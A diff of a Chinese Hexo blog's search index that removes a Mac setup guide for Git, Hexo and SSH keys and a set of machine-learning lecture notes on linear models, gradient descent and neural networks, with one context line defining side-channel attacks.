     <url>/2021/08/24/%E4%BE%A7%E4%BF%A1%E9%81%93%E6%94%BB%E5%87%BB%E6%8A%80%E6%9C%AF%E5%AD%A6%E4%B9%A0/</url>
     <content><![CDATA[<h2 id="侧信道攻击"><a href="#侧信道攻击" class="headerlink" title="侧信道攻击"></a>侧信道攻击</h2><p>侧信道攻击(side channel attack 简称SCA)，又称边信道攻击或旁路攻击，密码学中是指绕过对加密算法的繁琐分析，利用密码算法的硬件实现的运算中泄露的信息，如执行时间、功耗、电磁辐射等，结合统计理论快速的破解密码系统。其核心思想是通过加密软件或硬件运行时产生的各种泄漏信息获取密文信息。</p>
@@ -920,283 +1043,6 @@ $ hexo d # == hexo deploy 上传
       <tags>
         <tag>侧信道</tag>
         <tag>笔记</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Windows转Mac继续管理GitHub博客</title>
-    <url>/2021/08/24/Windows%E8%BD%ACMac%E7%BB%A7%E7%BB%AD%E7%AE%A1%E7%90%86GitHub%E5%8D%9A%E5%AE%A2/</url>
-    <content><![CDATA[<h2 id="变！"><a href="#变！" class="headerlink" title="变！"></a>变！</h2><p>从 Windwos 换了 Mac，怎么在 Mac 上继续使用 git 在 GitHub 上传自己的项目呢？</p>
-<p>解决方案：</p>
-<ol>
-<li>在 Mac 上下载 git 、 node.js 和 hexo</li>
-<li>在 Mac 上 clone 自己的项目到目录</li>
-</ol>
-<blockquote>
-<p>第一步：下载和安装</p>
-</blockquote>
-<p>这里使用 homebrew 进行安装<br>(1) 安装 homebrew</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/usr/bin/ruby -e &quot;$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/master/install)&quot;</span><br></pre></td></tr></table></figure>
-
-<p>(2) 下载 git 和 node.js </p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">brew install git</span><br><span class="line">brew install node</span><br><span class="line">npm install hexo g </span><br></pre></td></tr></table></figure>
-
-<p>可以使用 <code>git</code> 或 <code>git -verison</code> 命令来验证 git 版本。</p>
-<p>(3) 初始化 hexo 目录</p>
-<p>新建一个 hexo 目录用于存放博客相关文件</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mkdir bolg</span><br></pre></td></tr></table></figure>
-
-<p>在博客根目录打开终端窗口，对目录进行初始化操作</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hexo init</span><br></pre></td></tr></table></figure>
-
-<p>再用 <code>hexo s</code> 测试是否成功，打开 <code>localhost:4000</code> 即可查看本地预览 </p>
-<blockquote>
-<p>第二步： SSH 配置 git</p>
-</blockquote>
-<p>(1) 设置 <code>username</code> 和 <code>email</code> （github每次commit都会记录他们） </p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">git config --global user.name &quot;登录账号名&quot;</span><br><span class="line">git config --global user.email &quot;邮箱账号&quot;</span><br></pre></td></tr></table></figure>
-
-<p>(2) 先查看本地是否已存在 <code>SSH key</code></p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cd ~/.ssh</span><br></pre></td></tr></table></figure>
-
-<p>我的新电脑是没有的，直接通过终端命令创建 <code>ssh key</code> ，然后一直回车，输入 <code>用户名 + 密码</code>（ GitHub 登录的），最后会生成一串密钥。</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ssh-keygen -t rsa -C “邮箱账号&quot;</span><br></pre></td></tr></table></figure>
-
-<p>(3) 登陆 GitHub ，找到 Settings ，点击 SSH AND GPG Keys –&gt; New SSH key ，把刚刚看到的 key 复制粘贴进去，title 随便写</p>
-<figure class="highlight plaintext"><figcaption><span>复制id_rsa.pub</span></figcaption><table><tr><td class="code"><pre><span class="line">cat .ssh/id_rsa.pub</span><br></pre></td></tr></table></figure>
-
-<p>保存后，GitHub 会向邮箱发送一个验证链接，记得要登录邮箱进行验证，不然之后会导致部署不成功</p>
-<p>(4) 验证一下，如果出现 <code>hi +用户名</code> 即为成功 ~</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ssh -T git@github.com </span><br></pre></td></tr></table></figure>
-
-<blockquote>
-<p>第三步: clone 项目 / 文件配置转移</p>
-</blockquote>
-<p>把原来的项目复制下来，可以随便添加点东西去测试是否可以上传</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">git  clone https://wxxxx.git</span><br></pre></td></tr></table></figure>
-
-<p>这里我是直接复制原来 Windows 下的博客根目录 hexo 过来的，然后找到该目录下的：<code>_config.yml</code> 、 <code>scaffolds</code> 、 <code>source</code> 、 <code>themes</code> 这四个文件夹，把它们复制到<br>Mac 下的博客根目录 hexo，直接覆盖替换相同的文件文件夹就可以了。</p>
-<h2 id="problems-？"><a href="#problems-？" class="headerlink" title="problems ？"></a>problems ？</h2><h3 id="Mac-终端-shell-类型切换方法"><a href="#Mac-终端-shell-类型切换方法" class="headerlink" title="Mac 终端 shell 类型切换方法"></a>Mac 终端 shell 类型切换方法</h3><p>可以执行命令 <code>echo $SHELL</code>，先查看终端类型：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">bash: /bin/bash</span><br><span class="line">zsh: /bin/zsh</span><br></pre></td></tr></table></figure>
-
-<p>切换到bash，输入命令：<br><code>chsh -s /bin/bash</code></p>
-<p>切换到zsh，输入命令：<br><code>chsh -s /bin/zsh</code></p>
-<p>ps: 注意需要重启终端生效（强制退出后再打开）</p>
-<h3 id="GitHub-网站打不开或访问慢怎么解决"><a href="#GitHub-网站打不开或访问慢怎么解决" class="headerlink" title="GitHub 网站打不开或访问慢怎么解决"></a>GitHub 网站打不开或访问慢怎么解决</h3><p>查询 <code>github.com</code> 的有效IP，可以使用<a href="http://tool.chinaz.com/dns">站长工具</a><br>然后将查询到的 IP 地址复制到自己的 <code>hosts</code> 文件里即可。</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># Host Database</span><br><span class="line"># localhost is used to configure the loopback interface</span><br><span class="line"># when the system is booting.  Do not change this entry.</span><br><span class="line">##</span><br><span class="line">127.0.0.1	localhost</span><br><span class="line">255.255.255.255	broadcasthost</span><br><span class="line">::1             localhost</span><br><span class="line">203.208.39.104 github.com</span><br><span class="line">13.114.40.48 github.com</span><br><span class="line">52.69.186.44 github.com</span><br></pre></td></tr></table></figure>
-
-<h3 id="Mac如何编辑-hosts-系统文件"><a href="#Mac如何编辑-hosts-系统文件" class="headerlink" title="Mac如何编辑 hosts 系统文件"></a>Mac如何编辑 hosts 系统文件</h3><p><code>前往 -&gt; 前往文件夹 -&gt; （输入）/etc/hosts</code> ，回车找到 <code>hosts</code> 文件，然后打开对其进行编辑会提示没有权限并询问是否复制，点击复制按钮，然后在新的窗口里可以编辑文件，编辑完成后保存窗口显示文件名是未命名的 <code>hosts副本.txt</code> ，我们将名称改为 <code>hosts</code> (记得去除后缀名txt)，然后保存并替换原来的 <code>hosts</code> 文件。</p>
-<h3 id="Mac-的-ssh-文件在哪里"><a href="#Mac-的-ssh-文件在哪里" class="headerlink" title="Mac 的 .ssh 文件在哪里"></a>Mac 的 .ssh 文件在哪里</h3><p>鼠标点击一下桌面回到 🍎 菜单栏， <code>前往 -&gt; 前往文件夹 -&gt; （输入） ~/.ssh</code> 回车即可。<br>即：shift+command+G -&gt; 输入 ~/.ssh</p>
-]]></content>
-      <categories>
-        <category>配置</category>
-      </categories>
-      <tags>
-        <tag>Blog</tag>
-        <tag>Mac</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Machine Learning 2021 Spring - Day1</title>
-    <url>/2021/09/06/Machine-Learning-2021-Spring-Day1/</url>
-    <content><![CDATA[<h2 id="一、机器学习基本概念"><a href="#一、机器学习基本概念" class="headerlink" title="一、机器学习基本概念"></a>一、机器学习基本概念</h2><blockquote class="blockquote-center">
-            <i class="fa fa-quote-left"></i>
-            <p>Machine Learning  $\approx$  Looking for Function</p>
-
-            <i class="fa fa-quote-right"></i>
-          </blockquote>
-
-<p>机器学习就是让机器具备找一个函数式的能力，即一种实现人工智能的方法</p>
-<h3 id="Different-types-of-Functions"><a href="#Different-types-of-Functions" class="headerlink" title="Different types of Functions"></a>Different types of Functions</h3><p><strong><u>Regression</u></strong>: outputs a scalar.  它的输出是一个数值。</p>
-<p><strong><u>Classification</u></strong>: outputs the correct one from given options(classes).  从设定好的选项里面选择一个当作输出。</p>
-<p><strong><u>Structured Learning</u></strong>: create something with structure(image, document).   机器学会创造这件事。</p>
-<h3 id="Linear-Models-之机器学习找函数式的过程-——-三个步骤"><a href="#Linear-Models-之机器学习找函数式的过程-——-三个步骤" class="headerlink" title="Linear Models 之机器学习找函数式的过程 —— 三个步骤"></a>Linear Models 之机器学习找函数式的过程 —— 三个步骤</h3><blockquote>
-<ol>
-<li>Function with Unknown Parameters</li>
-</ol>
-</blockquote>
-<p>写出一个带有未知参数的函数式F， <strong>Model</strong>  $y = b + wx_1$ </p>
-<ul>
-<li>$y$ : Model, no. of views on 2/26</li>
-<li>$x_1$ : feature, no. of views on 2/25</li>
-<li>$w$ : weight, unkown parameters(learned from data)</li>
-<li>$b$ : bias, unkown parameters(learned from data)</li>
-</ul>
-<blockquote>
-<ol start="2">
-<li>Define Loss from Traning Data</li>
-</ol>
-</blockquote>
-<p>定义一个loss函数，输入是Model里面的参数 </p>
-<p><i class="fa fa-arrow-circle-right"></i> Loss is a function of parameters  $L(b, w)$</p>
-<p><i class="fa fa-arrow-circle-right"></i> Loss means how good a set of values is.  当未知参数被设定时，评估输出的这笔数值好还是不好</p>
-<p>对每一次的预测估计都有 $e = \mid y - \widehat{y} \mid$<br>最后计算得到结果 <strong>Loss</strong>  $L = \frac{1}{N} \sum_{i=1}^{n}{e_n} $</p>
-<ul>
-<li>$\widehat{y}$ : label, 真实的值（正确的数值）</li>
-<li>$e_i$ : 每次估测的值与正确的值之间的差距（有不同的计算方法）</li>
-<li>$N$ : 训练资料的总个数</li>
-<li>$L$ : 每一笔训练资料的误差，L越大代表这组参数越不好，L越小代表现在这组参数越好</li>
-</ul>
-<p>采用哪种方法来衡量距离e根据个人需求和对任务的理解来进行选择，这里选择<code>MAE</code></p>
-<p>$\bullet$  $e = \mid y - \widehat{y} \mid$    , L is mean absolute error(MAE)</p>
-<p>$\bullet$  $e = (y - \widehat{y})^2$          , L is mean square error(MSE)</p>
-<span class="label info">如果 $y$ 和 $\widehat{y}$ 都是几率分布的话可能会选择 `Cross- entropy`</span>
-
-<p>尝试不同的参数来计算各参数对应Loss而画出一个图叫 <code>Error Surface</code> （可以是1D或2D，即一个或两个参数可变）</p>
-<blockquote>
-<ol start="3">
-<li>Optimization</li>
-</ol>
-</blockquote>
-<p>解决一个最佳化的问题，找到最佳的w和b使得loss最小 </p>
-<p>$$w^*, b^* = arg\ min_{w,b}\ L $$</p>
-<p><strong><u>Gradient Descent</u></strong>  <span class="label primary">（一个参数的情况）</span></p>
-<p><i class="fa fa-chevron-right"></i> (Randomly) Pick an initial value $w^0$</p>
-<p><i class="fa fa-chevron-right"></i> Compute $\frac{\partial{L}}{\partial{w}}\vert_{w=w^0}$ ,<br>计算在$w=w^0$的时候w这个参数对Loss的微分是多少，即在error surface这一个点的切线斜率</p>
-<ul>
-<li>Negative $\Rightarrow$ Increase w , 斜率为负数则增大w，就可以使loss的值变小</li>
-<li>Positive $\Rightarrow$ Decrease w , 斜率为正数则减小w，可以让loss的值变小</li>
-</ul>
-<p>$$w^1 - w^0 = \eta * \frac{\partial{L}}{\partial{w}}|_{w=w^0}$$</p>
-<p><i class="fa fa-chevron-right"></i> Update $w$ iteratively</p>
-<ul>
-<li>$\eta$ : learnign rate, 学习速率（自己设定，值大学习快），当微分值为0时就不再更新参数</li>
-<li>hyperparameters: 机器学习中需要自己设定的参数    </li>
-</ul>
-<span class="label warning">这个方法可能存在local minima并不是我们想要的global minima的问题</span>
-
-<p><strong><u>Gradient Descent</u></strong>  <span class="label primary">（两个参数的情况）</span></p>
-<p><i class="fa fa-chevron-right"></i> (Randomly) Pick an initial value $w^0$, $b^0$</p>
-<p><i class="fa fa-chevron-right"></i> Compute<br>$\eta \frac{\partial{L}}{\partial{w}} \vert_{w=w^0,b=b^0}$ ,<br>$\eta \frac{\partial{L}}{\partial{b}} \vert_{w=w^0,b=b^0}$ ,<br>计算在$w=w^0,\ b=b^0$的位置w这个参数对Loss的微分是多少以及在$w=w^0,\ b=b^0$的位置w这个参数对Loss的微分是多少</p>
-<p><i class="fa fa-chevron-right"></i> Update $w$ and $b$ iteratively</p>
-<p>$$w^1 =  w^0 - \eta \frac{\partial{L}}{\partial{w}}|_{w=w^0,b=b^0}$$</p>
-<p>$$b^1 =  b^0 - \eta \frac{\partial{L}}{\partial{b}}|_{w=w^0,b=b^0}$$</p>
-<div class="note info">
-            <p>机器学习找函数式的以上三个步骤合起来称为 <em><strong><u>Training</u></strong></em> </p>
-          </div>
-
-<p>也就是说用旧的一些真实的数据训练的模型来预测之后可能的模型结果。</p>
-<span class="label info">通常一个模型的修改往往来自于对这个模型的理解，也就是`Domain Knowledg`</span>
-
-<p>观察我们随便乱写得到的真实模型发现每7天一个周期循环，所以写一个新模型 $y = b + \sum_{j=1}^7 w_jx_j$ ，发现sum求和数量依次增多后会达到一个饱和，误差率不再减小</p>
-<div class="note info">
-            <p>feature <code>x</code> * weight <code>w</code> + bias <code>b</code> 模型称作  <em><strong><u>Linear models</u></strong></em> </p>
-          </div>
-
-<p><img src="/2021/09/06/Machine-Learning-2021-Spring-Day1/1.LinearModels.png" alt="Linear Models"></p>
-<h3 id="New-Model-More-Features"><a href="#New-Model-More-Features" class="headerlink" title="New Model : More Features"></a>New Model : More Features</h3><p>但是linear models过于简单且有一定的限制，这个东西叫做 <em><strong>Model Bias</strong></em> ，由此产生了一个更复杂且含有未知参数的function</p>
-<p>All Piecewise Linear Curves = constant + sum of a set</p>
-<blockquote>
-<p>Sigmoid Function —— S型曲线</p>
-</blockquote>
-<p>曲折的直线函数可以看作一条曲线，而实际上sigmoid function 就是一个S型的曲线，它可以由一个函数式来表示</p>
-<p><img src="/2021/09/06/Machine-Learning-2021-Spring-Day1/2.sigmoid.png" alt="Sigmoid Function"></p>
-<p>$$<br>\begin{align}<br>y &amp; = c \ \frac{1}{1+e^{-(b+wx_1)}}  \<br>&amp; = c \ sigmoid \ (b+wx_1) \<br>\end{align}<br>$$</p>
-<p>曲折的直线函数也可以由一个常量和一些线段的集合来表示</p>
-<p><img src="/2021/09/06/Machine-Learning-2021-Spring-Day1/3.redcurve.png" alt="Sigmoid Function - sum of a set + constant"></p>
-<p>$$<br>\begin{align}<br>y &amp; = b + \sum_j w_jx_j  \<br>y &amp; = b + \sum_i c_i \ sigmoid \ (b_i + \sum_j w_{i,j}x_j)  \<br>\end{align}<br>$$</p>
-<p>其实函数式只有一些细微的差别，下面深入解析一下这个sigmoid function</p>
-<p><img src="/2021/09/06/Machine-Learning-2021-Spring-Day1/4.sigmoid_1.png" alt="sigmoid 解析"></p>
-<p><img src="/2021/09/06/Machine-Learning-2021-Spring-Day1/5.sigmoid_2.png" alt="sigmoid 解析"></p>
-<p><img src="/2021/09/06/Machine-Learning-2021-Spring-Day1/6.sigmoid_3.png" alt="sigmoid 解析"></p>
-<p><img src="/2021/09/06/Machine-Learning-2021-Spring-Day1/7.sigmoid_4.png" alt="sigmoid 解析"></p>
-<p><img src="/2021/09/06/Machine-Learning-2021-Spring-Day1/8.sigmoid_5.png" alt="sigmoid 解析"></p>
-<h3 id="Back-to-ML-Framework"><a href="#Back-to-ML-Framework" class="headerlink" title="Back to ML Framework"></a>Back to ML Framework</h3><blockquote>
-<p>Step 1: function with unknown</p>
-</blockquote>
-<p><img src="/2021/09/06/Machine-Learning-2021-Spring-Day1/9.newmodel.png" alt="function with unknown"></p>
-<blockquote>
-<p>Step 2: define loss from traning data</p>
-</blockquote>
-<p><i class="fa fa-arrow-circle-right"></i> Loss is a function of parameters  $L(\theta)$</p>
-<p><i class="fa fa-arrow-circle-right"></i> Loss means how good a set of values is. </p>
-<p><img src="/2021/09/06/Machine-Learning-2021-Spring-Day1/10.newmodel_loss.png" alt="Loss"></p>
-<p>得到结果 <strong>Loss</strong>  $L = \frac{1}{N} \sum_ne_n $</p>
-<blockquote>
-<p>Step 3: optimization</p>
-</blockquote>
-<p>$$<br>\begin{align}<br>\theta &amp;=<br>    \begin{bmatrix}<br>        \theta_1 \<br>        \theta_2 \<br>        \theta_3 \<br>         \vdots  \<br>    \end{bmatrix}<br>\end{align}<br>$$</p>
-<p>$$\theta^* = arg\ min_\theta\ L $$</p>
-<p><i class="fa fa-chevron-right"></i> (Randomly) Pick an initial value $\theta^0$</p>
-<p><i class="fa fa-chevron-right"></i> Compute $ g =  \nabla L (\theta^0) $</p>
-<p>$$<br>g_{gradient} = \begin{bmatrix}<br>                \frac{\partial L} {\partial \theta_1} |<em>{\theta = \theta^0} \<br>                \frac{\partial L} {\partial \theta_2} |</em>{\theta = \theta^0} \<br>                \vdots<br>               \end{bmatrix} \</p>
-<p>$$</p>
-<p>计算所有参数 $\theta^1、\theta^2、\theta^3$ 在 $\theta^0$ 的位置对 $L$ 的微分作为Gradient 向量。</p>
-<p>$$<br>\begin{bmatrix}<br>    \theta_1^1 \<br>    \theta_2^1 \<br>      \vdots   \<br>\end{bmatrix}<br> =<br>\begin{bmatrix}<br>    \theta_1^0 \<br>    \theta_2^0 \<br>      \vdots   \<br>\end{bmatrix}<br> -<br>\begin{bmatrix}<br>    \eta  \frac{\partial{L}}{\partial{\theta_1}}|<em>{\theta=\theta^0} \<br>    \eta  \frac{\partial{L}}{\partial{\theta_2}}|</em>{\theta=\theta^0} \<br>      \vdots   \<br>\end{bmatrix}<br>$$</p>
-<p><strong>Update</strong>  $ \theta^1 \leftarrow \theta^0 - \eta g $</p>
-<p><i class="fa fa-chevron-right"></i> Compute $ g =  \nabla L (\theta^1) $</p>
-<p><strong>Update</strong> $ \theta^2 \leftarrow \theta^1 - \eta g $</p>
-<p><i class="fa fa-chevron-right"></i> Compute $ g =  \nabla L (\theta^2) $</p>
-<p><strong>Update</strong> $ \theta^3 \leftarrow \theta^2 - \eta g $</p>
-<p>以此类推，通常做到不想做之后停下来</p>
-<p><img src="/2021/09/06/Machine-Learning-2021-Spring-Day1/11.optimization_of_newmodel.png" alt="optimization"></p>
-<p><img src="/2021/09/06/Machine-Learning-2021-Spring-Day1/12.Example.png" alt="Example"></p>
-<h3 id="Deep-Learning"><a href="#Deep-Learning" class="headerlink" title="Deep Learning"></a>Deep Learning</h3><blockquote>
-<p>Sigmoid ➡️ ReLU （Rectified Linear Unit ）</p>
-</blockquote>
-<p>除了sigmoid ，也可以使用<code>ReLU</code>函数</p>
-<p><img src="/2021/09/06/Machine-Learning-2021-Spring-Day1/13.ReLU.png" alt="Sigmoid-ReLU"></p>
-<p>$$<br>y  = b + \sum_{2i} c_i \ max \ (0, b_i + \sum_j w_{i,j}x_j)<br>$$</p>
-<blockquote>
-<p> Activation function</p>
-</blockquote>
-<p>我们称 sigmoid 和 max 为 <code>Activation function</code></p>
-<p><img src="/2021/09/06/Machine-Learning-2021-Spring-Day1/14.ActivationFunction.png" alt="Activation function"></p>
-<blockquote>
-<p>Hyperparameters</p>
-</blockquote>
-<p>这些生成的可控的参数就称之为<code>Hyperparameters</code></p>
-<p><img src="/2021/09/06/Machine-Learning-2021-Spring-Day1/15.Hyperparameters.png" alt="Hyperparameters"></p>
-<blockquote>
-<p>Neutral Network</p>
-</blockquote>
-<p>我们将激活函数称为Neuron神经元，复合而成就生称了<code>Neutral Network</code>神经网络</p>
-<p><img src="/2021/09/06/Machine-Learning-2021-Spring-Day1/16.NeutralNetwork.png" alt="Neutral Network"></p>
-<blockquote>
-<p>Deep Learning</p>
-</blockquote>
-<p>每一层神经元就称为hidden layer隐藏层，由很多层组成的神经网络我们叫它<code>Deep Learning</code>深度学习</p>
-<p><img src="/2021/09/06/Machine-Learning-2021-Spring-Day1/17.DeepLearning.png" alt="Deep Learning"></p>
-<blockquote>
-<p>Overfitting</p>
-</blockquote>
-<p>但有时候使用更多的层数并没有更好的效率，训练集准确率高了但实际预测数据集准确率很低，这是因为达到了<code>Overfitting</code>过拟合。</p>
-<p><img src="/2021/09/06/Machine-Learning-2021-Spring-Day1/18.Overfitting.png" alt="Overfitting"></p>
-<h3 id="To-Learn-More-Three-Steps-for-Deep-Learning"><a href="#To-Learn-More-Three-Steps-for-Deep-Learning" class="headerlink" title="To Learn More - Three Steps for Deep Learning"></a>To Learn More - Three Steps for Deep Learning</h3><blockquote>
-<p>Step 1: define a set of function</p>
-</blockquote>
-<p>这个function其实就是Neural Network，然后将这些Neural Network用不同的方式连接起来，比如<code>Fully Connect Feedforward Network</code>，就是将前一层和后一层的每个神经元都互相连接起来。</p>
-<p><img src="/2021/09/06/Machine-Learning-2021-Spring-Day1/19.FullyConnectFeedforwardNetwork_example1.png" alt="Example 1 - Fully Connect Feedforward Network"></p>
-<p>对于每条线和每个点，我们给它们添加上weight和bias的值，然后带入公式 $y=b+wx$ 计算，再通过sigmoid function的结果就是输出。</p>
-<p><img src="/2021/09/06/Machine-Learning-2021-Spring-Day1/20.FullyConnectFeedforwardNetwork_example2.png" alt="Example 1 - Fully Connect Feedforward Network"></p>
-<p>通常来讲，我们会有很多排neuron，每一排neuron里面可能会有很多个neuron，在layer和layer之间的neuron，是两两互相连接的，layer1的neuron的output就是所有layer2的neuron<br>的input，layer2的neuron的nput就是所有layer1的output。整个Network需要一个input，这个input就是一个vector， 对layer1的每一个neuron来说，它的input就是input layer的每一个dimension。最后假设第L排有M个neuron的话，这M个layer L的输出就是最后的output，组成一个vector。</p>
-<p><img src="/2021/09/06/Machine-Learning-2021-Spring-Day1/21.FullyConnectFeedforwardNetwork.png" alt="Fully Connect Feedforward Network"></p>
-<div class="note info">
-            <p>Deep = Many hidden layers</p>
-          </div>
-
-<p>Network的运作我们常常会用<code>Matrix Operation</code>来表示</p>
-<p><img src="/2021/09/06/Machine-Learning-2021-Spring-Day1/22.MatrixOperation_1.png" alt="Matrix Operation"></p>
-<p>对于一整个neural network，我们也可以使用<code>Matrix Operation</code>这样表示</p>
-<p><img src="/2021/09/06/Machine-Learning-2021-Spring-Day1/23.MatrixOperation_2.png" alt="Matrix Operation"></p>
-<p>比如手写数字识别，对于一个neural network我们也可以将最后一层output当作一个<code>multiclass classifier</code>，然后对其添加softMax，最后输出就是每一个数字的概率。</p>
-<blockquote>
-<p>Step 2: goodness of function</p>
-</blockquote>
-<p>假设给定了一组参数，要做手写数字辨识，我有一张image跟它的label，于是现在的target就是一个10维的vector，只有在第一纬对应到数字1的地方它的值为1，其他都是0。将image的pixel输入，得到一组输出y，然后计算 $y$ 跟 $\widehat y$ 之间的 <code>cross entropy</code> ，接下来就是要调整network的参数使得这个 cross entropy 的值越小越好。</p>
-<p><img src="/2021/09/06/Machine-Learning-2021-Spring-Day1/24.CrossEntropy.png" alt="Cross Entropy"></p>
-<p>而实际上我们会对一大堆data进行training，将每个数据的cross entropy加起来得到一个<code>total loss L</code>，就是如何 minimize 这个 loss L的问题了。</p>
-<p><img src="/2021/09/06/Machine-Learning-2021-Spring-Day1/25.TotalLoss.png" alt="Total Loss"></p>
-<blockquote>
-<p>Step 3: pick the best function</p>
-</blockquote>
-<p>采用 <code>Gradient Descent</code> 方法找到最优，像之前一样计算微分得到gradient向量，然后更新参数，不断反复进行这个process。</p>
-<p><img src="/2021/09/06/Machine-Learning-2021-Spring-Day1/26.GradientDescent.png" alt="Gradient Descent - pick the best function"></p>
-]]></content>
-      <categories>
-        <category>笔记</category>
-      </categories>
-      <tags>
-        <tag>MachineLearning</tag>
       </tags>
   </entry>
 </search>
